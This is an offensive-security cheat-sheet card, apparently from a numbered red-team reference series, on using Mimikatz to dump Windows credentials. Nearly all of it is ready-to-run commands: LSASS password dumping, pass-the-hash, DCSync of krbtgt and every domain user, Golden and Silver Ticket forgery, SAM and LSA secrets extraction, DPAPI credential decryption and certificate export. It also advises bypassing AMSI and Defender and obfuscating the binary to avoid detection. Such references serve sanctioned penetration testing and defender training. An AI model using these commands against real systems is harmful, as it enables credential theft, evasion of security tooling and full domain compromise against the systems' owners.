# 03.19 Mimikatz

> Definitive Windows credential dumping toolkit — LSASS dump, DCSync, Kerberos ticket ops, Golden Ticket, DPAPI.

## Overview

Mimikatz is the de-facto Windows credential dumping tool. Modules: `sekurlsa::*` (LSASS), `lsadump::*` (DCSync, SAM, secrets), `kerberos::*` (ticket forging), `dpapi::*` (DPAPI master keys), `crypto::*` (cert export), `vault::*` (Windows credential vault). Heavily signatured — pair with AMSI bypass and on-disk obfuscation if running unmodified.

## Steps

- **Step 1** - Get binary (or run via PowerShell wrapper).
- **Step 2** - Bypass AMSI / Defender before launching.
- **Step 3** - Need SeDebugPrivilege (typically administrator).
- **Step 4** - Common modules: privilege, sekurlsa, lsadump, kerberos.

## Commands

### Run

```powershell
# Bypass AMSI first if Defender enabled — see AMSI Bypass cards
mimikatz.exe
```

### Privilege escalation in mimikatz

```mimikatz
privilege::debug
token::elevate
```

### LSASS dump (logon passwords)

```mimikatz
sekurlsa::logonpasswords
# Same data without mimikatz:
# rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <LSASS-PID> C:\dump.dmp full
```

### Pass-the-Hash session injection

```mimikatz
sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<NT-HASH> /run:cmd.exe
```

### DCSync — pull any user's hash

```mimikatz
lsadump::dcsync /domain:<DOMAIN> /user:krbtgt
lsadump::dcsync /domain:<DOMAIN> /user:Administrator
lsadump::dcsync /domain:<DOMAIN> /all /csv
```

### Golden Ticket (forge any user)

```mimikatz
kerberos::purge
kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN-SID> /krbtgt:<KRBTGT-NT-HASH> /ptt
```

### Silver Ticket (forge service ticket)

```mimikatz
kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN-SID> /target:<TARGET-FQDN> /service:cifs /rc4:<TARGET-MACHINE-NT> /ptt
```

### SAM dump (local accounts)

```mimikatz
token::elevate
lsadump::sam
```

### LSA secrets

```mimikatz
lsadump::secrets
lsadump::lsa /patch
```

### DPAPI master keys + Chrome cookies

```mimikatz
dpapi::masterkey /in:C:\Users\<USER>\AppData\Roaming\Microsoft\Protect\<SID>\<MK-GUID>
dpapi::cred /in:C:\Users\<USER>\AppData\Local\Microsoft\Credentials\<CRED-GUID>
```

### Export certificates

```mimikatz
crypto::capi
crypto::cng
crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE
```
